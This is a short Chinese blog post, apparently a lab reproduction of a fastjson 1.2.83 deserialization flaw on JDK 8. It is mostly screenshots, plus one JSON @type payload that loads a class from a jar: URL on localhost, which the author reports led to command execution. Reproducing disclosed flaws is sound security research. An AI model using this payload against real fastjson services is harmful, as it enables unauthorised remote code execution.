+++
categories = ["安全研究"]
tags = ["漏洞复现"]
description = "复现"
title = "fastjson 1.2.83 无需 gadget 复现"
date = 2026-10-06T00:25:33+08:00
draft = false
pin = false
+++

漏洞目录

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260721231317016.png)

启动命令

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260721231342206.png)

![](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260721231432828.png)

然后可以bp 启动  也可以浏览器启动 

这里我们开启浏览器   使用这个 payload  

{"@type":"jar:http:..localhost:18080.probe!.POC","x":1} 

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260721231630662.png)


然后点击运行   此时发现已经命令执行了  日志也已经更改为成功

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260721231701274.png)


所有此时 在 jdk 8 上的漏洞验证成功  



